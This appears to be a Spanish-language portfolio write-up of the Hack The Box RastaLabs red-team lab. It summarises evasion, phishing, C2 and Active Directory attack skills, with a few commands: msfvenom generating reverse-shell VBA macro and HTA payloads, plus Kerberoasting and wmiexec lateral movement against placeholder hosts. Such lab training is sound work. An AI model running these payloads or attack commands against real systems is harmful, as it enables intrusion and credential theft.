---
title: "RastaLabs Red Team Operator"
date: 2025-03-25
level: "Hard"
platform: "Hack The Box"
category: "Pro Lab"
duration: "Simulated Campaign"
image: "/images/about/rastalab.jpg"
tags: ["Red Teaming", "Evasion", "Phishing", "Persistence"]
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![ProLab](https://img.shields.io/badge/Pro_Lab-RastaLabs-red?style=for-the-badge)
![Level](https://img.shields.io/badge/Level-Hard-red?style=for-the-badge)
![Team](https://img.shields.io/badge/Team-CyberFlippers-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

---

| Campo | Valor |
|-------|-------|
| Pro Lab | RastaLabs |
| Plataforma | Hack The Box |
| Dificultad | Hard |
| Entorno | Red corporativa Windows con defensas activas |
| Enfoque | Red Teaming, Evasion AV/EDR, Phishing, C2, Persistencia |

## Sobre RastaLabs

**RastaLabs** es un Pro Lab de Hack The Box clasificado como **Hard**, disenado especificamente para simular una operacion de **Red Team completa** contra una red corporativa Windows con defensas activas. A diferencia de otros labs donde el objetivo es simplemente obtener acceso administrativo, RastaLabs exige al operador mantener la operacion en secreto — el entorno tiene antivirus activo, Application Whitelisting (AppLocker) y monitoreo, forzando al operador a operar con sigilo constante.

El lab simula el ciclo completo de una operacion Red Team: reconocimiento OSINT, acceso inicial via phishing, despliegue de infraestructura C2, movimiento lateral evadiendo deteccion, escalada de privilegios en Active Directory, y persistencia a largo plazo. El entorno esta construido sobre un dominio Windows Active Directory con multiples estaciones de trabajo y servidores, donde cada paso debe considerar la evasion de controles de seguridad.

**Vectores cubiertos:**
- **Phishing & Social Engineering** — Creacion de payloads weaponizados (macros, HTAs, OLE objects) para acceso inicial
- **AV/EDR Evasion** — AMSI bypass, obfuscation de herramientas, custom loaders, en-memoria execution
- **Application Whitelisting Bypass** — Tecnicas para ejecutar codigo arbitrario bajo politicas AppLocker
- **Command & Control** — Despliegue y operacion de frameworks C2 con perfiles de trafico que imitan trafico legitimo
- **Active Directory Attacks** — Kerberoasting, delegation abuse, trust exploitation con enfoque stealth

---

## 🔒 Confidential Assessment Profile

**Target Environment**: `Defended Corporate Network`
**Operational Doctrine**: `Stealth & Persistence`

---

## ⚔️ Tactical Competencies

### 1. Evasion Superiority
*   **AMSI Patching**: Patching en memoria de `amsi.dll` para neutralizar la inspeccion de scripts PowerShell y .NET. Multiples tecnicas de bypass incluyendo reflection-based patching y memory manipulation.
*   **Custom Tooling**: Compilacion y modificacion de herramientas ofensivas (C#, PowerShell) para evadir firmas estaticas — ofuscacion de strings, modificacion de indicadores de compromiso (IOCs) y timestomping.
*   **AppLocker Bypass**: Ejecucion de codigo arbitrario utilizando binarios firmados de Microsoft (LOLBins), alternate execution paths y abuso de directorios de confianza.
*   **In-Memory Execution**: Carga y ejecucion de ensamblados .NET directamente en memoria para evitar deteccion basada en disco (fileless attacks).

### 2. Initial Access Vectors
*   **Weaponized Documents**: Creacion de documentos maliciosos con macros VBA ofuscadas, HTAs y objetos OLE para campanas de phishing dirigido.
*   **OSINT & Reconnaissance**: Reconocimiento pasivo para identificar empleados, roles y relaciones organizacionales que permitan campanas de ingenieria social dirigida y creible.
*   **Payload Delivery**: Tecnicas de entrega de payloads que evaden filtros de correo y sandboxing, incluyendo staged payloads y execution guardrails.

### 3. C2 & Persistence
*   **C2 Framework Deployment**: Configuracion y operacion de frameworks de Command & Control con perfiles de comunicacion que imitan trafico web legitimo (Malleable C2 profiles).
*   **Traffic Shaping**: Configuracion de parametros de C2 (Jitter, Sleep intervals, kill dates) para producir patrones de trafico que se mezclen con el trafico normal de la organizacion.
*   **Userland Persistence**: Tecnicas de persistencia sin privilegios administrativos — Registry run keys, scheduled tasks de usuario, startup folders — disenadas para sobrevivir reinicios sin disparar alertas.
*   **Privileged Persistence**: Una vez obtenidos privilegios elevados, implantacion de mecanismos de persistencia avanzados (WMI event subscriptions, Golden Tickets).

### 4. Active Directory Operations
*   **Stealth Enumeration**: Enumeracion de AD minimizando el ruido — consultas LDAP dirigidas, uso selectivo de BloodHound, evitando scans masivos que disparen alertas.
*   **Kerberos Attacks**: Kerberoasting selectivo, AS-REP Roasting y abuso de delegacion, priorizando cuentas de alto valor y evitando honeypots.
*   **Lateral Movement**: Movimiento lateral utilizando tecnicas que evaden monitoreo — WMI, DCOM, PSRemoting con credenciales legitimamente obtenidas.

## Metodologia Aplicada

### 1. Reconocimiento y Acceso Inicial

```bash
# OSINT - Enumeracion de usuarios del dominio
# (informacion publica, LinkedIn, metadata de documentos)

# Generacion de payload para phishing
# Macro VBA ofuscada para evadir deteccion
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<C2_IP> LPORT=443 \
    -f vba -o macro.vba

# Alternativa: HTA payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> \
    -f hta-psh -o payload.hta
```

### 2. Evasion de AMSI y AppLocker

```powershell
# AMSI Bypass (ejemplo conceptual - las firmas cambian constantemente)
# El operador debe adaptar y ofuscar cada tecnica para el entorno especifico

# Verificar politicas de AppLocker
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections

# Identificar directorios con permisos de escritura y ejecucion
# Buscar excepciones en las politicas para LOLBins
Get-ChildItem "C:\Windows\Tasks" -ErrorAction SilentlyContinue
```

### 3. Operaciones C2

```bash
# Configuracion de listener con perfil de trafico legitimo
# (El perfil C2 debe imitar trafico a servicios cloud comunes)

# Verificar conectividad del agente
# Sleep/Jitter configurados para reducir patrones detectables
# Ejemplo: sleep 60s con 50% jitter = callbacks entre 30s y 90s
```

### 4. Movimiento Lateral Sigiloso

```bash
# Enumeracion de AD con BloodHound (sesion unica, minima huella)
bloodhound-python -u <user> -p '<pass>' -d <domain> -c All --zip -ns <DC_IP>

# Kerberoasting selectivo (solo cuentas de interes)
GetUserSPNs.py <domain>/<user>:'<pass>' -dc-ip <DC_IP> -request \
    -target-user <high_value_account>

# Movimiento lateral via WMI (menos detectado que PsExec)
wmiexec.py <domain>/<user>:'<pass>'@<TARGET_IP>
```

## Herramientas Utilizadas

| Herramienta | Proposito |
|-------------|-----------|
| `BloodHound / SharpHound` | Mapeo de rutas de ataque AD (ejecucion controlada) |
| `Rubeus` | Ataques Kerberos con evasion |
| `Impacket (wmiexec, GetUserSPNs)` | Movimiento lateral y Kerberoasting |
| `Covenant / Sliver` | Frameworks C2 con perfiles de evasion |
| `Custom C# / PowerShell loaders` | Ejecucion en memoria evadiendo AV |
| `Mimikatz (modified)` | Extraccion de credenciales (versiones ofuscadas) |
| `CrackMapExec / NetExec` | Validacion de credenciales y enumeracion |
| `LOLBins (mshta, regsvr32, rundll32)` | Ejecucion de codigo bajo AppLocker |
| `hashcat / john` | Cracking offline de hashes y tickets Kerberos |

## Key Takeaways

1. **La evasion es una disciplina continua, no un truco puntual** — Las firmas de AV/EDR cambian constantemente; el operador debe adaptar sus tecnicas a cada engagement, no depender de bypasses estaticos.
2. **El sigilo define al Red Teamer** — La diferencia entre un pentester y un operador de Red Team es la capacidad de operar sin ser detectado. Cada accion debe evaluarse por su impacto en la deteccion.
3. **Phishing sigue siendo el vector de acceso inicial mas efectivo** — A pesar de filtros avanzados, los documentos weaponizados con ingenieria social dirigida mantienen una alta tasa de exito.
4. **La paciencia es una herramienta tactica** — Operar "Low and Slow" (sleep intervals largos, movimiento lateral gradual) reduce drasticamente la probabilidad de deteccion por anomalias de comportamiento.
5. **El C2 es infraestructura critica** — La configuracion del canal de comunicacion (trafico, perfiles, redirectores) es tan importante como las tecnicas de explotacion.

---

## 🏆 Operational Impact

RastaLabs es la prueba definitiva de **paciencia y sigilo**. Certifica que el operador puede comprometer una red con defensas activas y listas blancas, operando "Low and Slow". Valida el perfil de un Red Team Operator completo: desde la creacion de payloads que evaden deteccion, hasta la operacion sostenida de infraestructura C2 y el compromiso de Active Directory sin disparar alertas — las competencias exactas que definen una operacion de Red Team profesional.

---

<div align="center">

**Flippermen**
*HackTheBox — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
